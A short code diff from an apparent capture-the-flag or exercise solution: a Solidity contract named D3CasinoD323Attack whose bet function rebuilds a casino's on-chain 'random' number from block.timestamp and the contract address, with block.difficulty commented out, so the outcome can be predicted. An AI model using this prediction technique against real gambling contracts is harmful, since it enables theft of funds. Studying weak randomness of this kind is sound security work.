@@ -20,7 +20,7 @@ contract D3CasinoD323Attack {
     function bet(address target) public {
         uint256 rand = uint256(
         keccak256(
-                abi.encodePacked(block.timestamp, block.difficulty, this)
+                abi.encodePacked(block.timestamp, /*block.difficulty,*/ this)
             )
         ) % 17;
         value = rand;
